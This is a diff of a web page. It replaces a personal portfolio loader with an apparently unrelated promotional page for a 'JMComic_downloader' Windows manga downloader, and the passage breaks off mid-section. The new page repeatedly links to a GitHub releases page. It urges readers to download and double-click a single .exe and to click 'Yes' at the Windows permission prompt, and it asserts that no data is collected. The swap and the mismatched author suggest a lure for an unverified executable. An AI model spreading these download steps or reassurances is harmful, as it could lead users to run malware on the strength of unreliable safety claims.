@@ -1,23 +1,110 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Emmanuel Abolade — Loading…</title>
-<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JMComic_downloader - Download Manga, Comics & More on Windows</title>
+    <meta name="description" content="JMComic_downloader is a free, easy-to-use Windows app to download JMComic (18comic) manga by ID, search, browse rankings, and export to PDF, ZIP, or long image. No Python required. Get started now.">
+    <meta name="keywords" content="JMComic downloader, 18comic downloader, manga downloader, comic downloader, JMComic, 18comic, download manga Windows, PDF ZIP long image, CLI, agent skill">
+    <meta name="author" content="gonzalorodlike9177">
+    <meta property="og:title" content="JMComic_downloader - Download Manga & Comics Easily on Windows">
+    <meta property="og:description" content="Free Windows GUI to download JMComic/18comic manga by ID, search, browse rankings, and export to PDF, ZIP, or long image. No Python needed.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/gonzalorodlike9177/JMComic_downloader">
+    <meta property="og:image" content="https://github.com/gonzalorodlike9177/JMComic_downloader/releases">
 </head>
-<body>
-<script>
-(async () => {
-  const parts = await Promise.all([0,1,2,3].map(i =>
-    fetch('/_assemble/index.part' + i).then(r => { if (!r.ok) throw new Error(r.status); return r.text(); })
-  ));
-  document.open();
-  document.write(parts.join(''));
-  document.close();
-})().catch(e => {
-  document.body.textContent = 'Failed to assemble portfolio: ' + e;
-});
-</script>
-</body>
-</html>
+<body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f5f7fa; color: #1a202c; line-height: 1.6;">
+
+<div style="max-width: 900px; margin: 0 auto; padding: 40px 20px;">
+
+    <!-- Header section -->
+    <div style="text-align: center; background: white; border-radius: 16px; padding: 40px 30px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.07); margin-bottom: 30px; border: 1px solid #e2e8f0;">
+        <h1 style="font-size: 2.2em; margin: 0 0 15px 0; color: #2d3748; font-weight: 800;">🖥️ JMComic_downloader - Download Manga Without Any Hassle</h1>
+        <p style="font-size: 1.1em; color: #4a5568; margin: 0 0 25px 0; max-width: 700px; margin-left: auto; margin-right: auto;">Your all-in-one Windows tool for downloading JMComic (18comic) manga by ID, searching titles, checking rankings, and exporting to PDF, ZIP, or long image — no programming skills needed.</p>
+        <a href="https://github.com/gonzalorodlike9177/JMComic_downloader/releases" style="display: inline-block; background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 16px 32px; border-radius: 50px; font-size: 1.2em; font-weight: bold; text-decoration: none; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4); transition: transform 0.2s ease, box-shadow 0.2s ease; border: none; cursor: pointer;">⬇️ Download Now for Windows</a>
+    </div>
+
+    <!-- Quick overview section -->
+    <div style="background: white; border-radius: 16px; padding: 35px 30px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.07); margin-bottom: 30px; border: 1px solid #e2e8f0;">
+        <h2 style="font-size: 1.6em; color: #2d3748; margin-top: 0; margin-bottom: 20px; border-bottom: 3px solid #667eea; padding-bottom: 10px;">✨ What is JMComic_downloader?</h2>
+        <p style="font-size: 1.05em; margin: 0 0 15px 0;">JMComic_downloader is a simple, friendly application that lets you download manga and comics from JMComic (also known as 18comic) directly to your Windows computer. Whether you want to read offline, keep a backup of your favorite series, or organize your collection, this tool makes it super easy.</p>
+        <p style="font-size: 1.05em; margin: 0;">It's built with a focus on simplicity. You don't need to install Python, use complex command lines, or know anything about coding. Just download the app, open it, and start downloading. The interface is clean, visual, and intuitive — perfect for everyday users.</p>
+    </div>
+
+    <!-- Features section -->
+    <div style="background: white; border-radius: 16px; padding: 35px 30px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.07); margin-bottom: 30px; border: 1px solid #e2e8f0;">
+        <h2 style="font-size: 1.6em; color: #2d3748; margin-top: 0; margin-bottom: 20px; border-bottom: 3px solid #667eea; padding-bottom: 10px;">🚀 Key Features</h2>
+        <ul style="list-style-type: none; padding: 0; margin: 0; font-size: 1.05em;">
+            <li style="margin-bottom: 15px; padding-left: 30px; position: relative;">📥 <strong>Download by ID:</strong> Know the comic's ID? Type it in, and the app grabs it instantly.</li>
+            <li style="margin-bottom: 15px; padding-left: 30px; position: relative;">🔍 <strong>Smart Search:</strong> Search for comics by title or keyword right from the app. Find what you want without browsing endless pages.</li>
+            <li style="margin-bottom: 15px; padding-left: 30px; position: relative;">🏆 <strong>Browse Rankings:</strong> Check out the most popular and trending comics directly from the built-in ranking viewer.</li>
+            <li style="margin-bottom: 15px; padding-left: 30px; position: relative;">📄 <strong>Export to PDF, ZIP, or Long Image:</strong> Save your downloaded comics in the format that suits you best. Read as a PDF on any device, keep a ZIP archive for backup, or create a single long image for convenient scrolling.</li>
+            <li style="margin-bottom: 15px; padding-left: 30px; position: relative;">🖥️ <strong>Standalone Windows GUI:</strong> A beautiful, user-friendly graphical interface that works on Windows 7, 8, 10, and 11. No Python or extra software required.</li>
+            <li style="margin-bottom: 15px; padding-left: 30px; position: relative;">🔧 <strong>Multiple Ways to Use:</strong> Besides the GUI, it also includes a powerful Command Line Interface (CLI) for advanced users and a portable Agent Skill that can integrate with DSH, Codex, or Claude Code.</li>
+            <li style="padding-left: 30px; position: relative;">⚡ <strong>Fast & Reliable:</strong> Built on a proven, high-performance engine that downloads comics quickly and accurately.</li>
+        </ul>
+    </div>
+
+    <!-- How to download section -->
+    <div style="background: white; border-radius: 16px; padding: 35px 30px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.07); margin-bottom: 30px; border: 1px solid #e2e8f0;">
+        <h2 style="font-size: 1.6em; color: #2d3748; margin-top: 0; margin-bottom: 20px; border-bottom: 3px solid #667eea; padding-bottom: 10px;">📦 Download & Install</h2>
+        <p style="font-size: 1.05em; margin: 0 0 20px 0;"><strong>Getting started is simple:</strong></p>
+        <div style="background: #f0f4ff; border-left: 5px solid #667eea; padding: 15px 20px; border-radius: 8px; margin-bottom: 20px; font-size: 1.1em;">
+            👉 <strong>Step 1:</strong> <a href="https://github.com/gonzalorodlike9177/JMComic_downloader/releases" style="color: #667eea; font-weight: bold;">Visit this link to download the application.</a>
+        </div>
+        <p style="font-size: 1.05em; margin: 0 0 20px 0;"><strong>Step 2:</strong> Once the page opens, look for the latest release. You'll see a file available for download — click the download button next to it. The file is a single executable (.exe) file, so you don't need to extract or install anything.</p>
+        <p style="font-size: 1.05em; margin: 0 0 20px 0;"><strong>Step 3:</strong> After the download finishes, go to your "Downloads" folder and double-click the file to run it. Windows might ask for permission — just click "Yes" or "Run" to allow it.</p>
+        <p style="font-size: 1.05em; margin: 0;">That's it! The application will open, and you can start downloading comics right away.</p>
+        <div style="text-align: center; margin-top: 30px;">
+            <a href="https://github.com/gonzalorodlike9177/JMComic_downloader/releases" style="display: inline-block; background: #2d3748; color: white; padding: 14px 30px; border-radius: 8px; font-size: 1.1em; font-weight: 600; text-decoration: none; box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2); transition: background 0.2s ease;">🔗 Go to Download Page</a>
+        </div>
+    </div>
+
+    <!-- Usage guide section -->
+    <div style="background: white; border-radius: 16px; padding: 35px 30px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.07); margin-bottom: 30px; border: 1px solid #e2e8f0;">
+        <h2 style="font-size: 1.6em; color: #2d3748; margin-top: 0; margin-bottom: 20px; border-bottom: 3px solid #667eea; padding-bottom: 10px;">🎮 How to Use</h2>
+        <p style="font-size: 1.05em; margin: 0 0 20px 0;">The app is designed to be super intuitive. Here's a quick guide to get you going:</p>
+        <ol style="font-size: 1.05em; padding-left: 25px; margin: 0;">
+            <li style="margin-bottom: 10px;"><strong>Download by ID:</strong> On the main screen, you'll see a text box. Type the numeric ID of the comic you want (e.g., 123456) and click the "Download" button. The app will fetch the comic and save it to your chosen folder.</li>
+            <li style="margin-bottom: 10px;"><strong>Search:</strong> Use the search bar to type the name of a comic. A list of results will appear — click on any to see details and download it.</li>
+            <li style="margin-bottom: 10px;"><strong>Rankings:</strong> Click on the "Rankings" tab to see the latest popular comics. Browse and download directly from the list.</li>
+            <li style="margin-bottom: 10px;"><strong>Choose Export Format:</strong> Before downloading, you can pick your preferred format (PDF, ZIP, or Long Image) from a simple dropdown menu.</li>
+            <li><strong>Save Location:</strong> Choose where you want your comics to be saved. You can select a folder once, and it will remember it for next time.</li>
+        </ol>
+    </div>
+
+    <!-- Additional features section -->
+    <div style="background: white; border-radius: 16px; padding: 35px 30px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.07); margin-bottom: 30px; border: 1px solid #e2e8f0;">
+        <h2 style="font-size: 1.6em; color: #2d3748; margin-top: 0; margin-bottom: 20px; border-bottom: 3px solid #667eea; padding-bottom: 10px;">🔧 For Advanced Users</h2>
+        <p style="font-size: 1.05em; margin: 0 0 20px 0;">While most people will use the simple GUI, JMComic_downloader also offers:</p>
+        <ul style="list-style-type: none; padding: 0; margin: 0; font-size: 1.05em;">
+            <li style="margin-bottom: 15px; padding-left: 30px; position: relative;">⌨️ <strong>JSON-First CLI:</strong> A command-line interface that outputs JSON, perfect for scripting, automation, or integration with other tools. Advanced users can use commands to download, search, and export with full control.</li>
+            <li style="margin-bottom: 15px; padding-left: 30px; position: relative;">🤖 <strong>Portable Agent Skill:</strong> A ready-to-use skill for AI agents like DSH, Codex, or Claude Code. This allows AI assistants to use the downloader directly, enabling automated workflows.</li>
+            <li style="padding-left: 30px; position: relative;">⚙️ <strong>Shared Engine:</strong> All interfaces (GUI, CLI, Agent Skill) use the same robust, battle-tested Python engine (though you don't need Python installed to use the GUI).</li>
+        </ul>
+    </div>
+
+    <!-- FAQ section -->
+    <div style="background: white; border-radius: 16px; padding: 35px 30px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.07); margin-bottom: 30px; border: 1px solid #e2e8f0;">
+        <h2 style="font-size: 1.6em; color: #2d3748; margin-top: 0; margin-bottom: 20px; border-bottom: 3px solid #667eea; padding-bottom: 10px;">❓ Frequently Asked Questions</h2>
+        <div style="margin-bottom: 20px;">
+            <p style="font-weight: bold; margin: 0 0 8px 0;">Q: Do I need to install Python?</p>
+            <p style="margin: 0; font-size: 1.05em;">No! The Windows GUI version is completely standalone. It includes everything it needs to run. Just download and double-click to run.</p>
+        </div>
+        <div style="margin-bottom: 20px;">
+            <p style="font-weight: bold; margin: 0 0 8px 0;">Q: What Windows versions are supported?</p>
+            <p style="margin: 0; font-size: 1.05em;">The app is designed to work on Windows 7, 8, 10, and 11. For the best experience, we recommend Windows 10 or 11.</p>
+        </div>
+        <div style="margin-bottom: 20px;">
+            <p style="font-weight: bold; margin: 0 0 8px 0;">Q: Can I download multiple comics at once?</p>
+            <p style="margin: 0; font-size: 1.05em;">Yes, you can queue up multiple downloads. Just add them one by one, and the app will process them in order.</p>
+        </div>
+        <div>
+            <p style="font-weight: bold; margin: 0 0 8px 0;">Q: Is my personal data safe?</p>
+            <p style="margin: 0; font-size: 1.05em;">Absolutely. The app runs entirely on your local machine. It only downloads the comics you request. No personal information is collected or transmitted.</p>
+        </div>
+    </div>
+
+    <!-- System requirements section -->
+    <div style="background: white; border-radius: 16px; padding: 35px 30px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.07); margin-bottom: 30px; border: 1px solid #e2e8f0;">
+        <h2 style="font-size: 1.6em; color: #2d3748; margin-top: 0; margin-bottom: 20px; border-bottom: 3px solid #667eea; padding-bottom: 10px;">
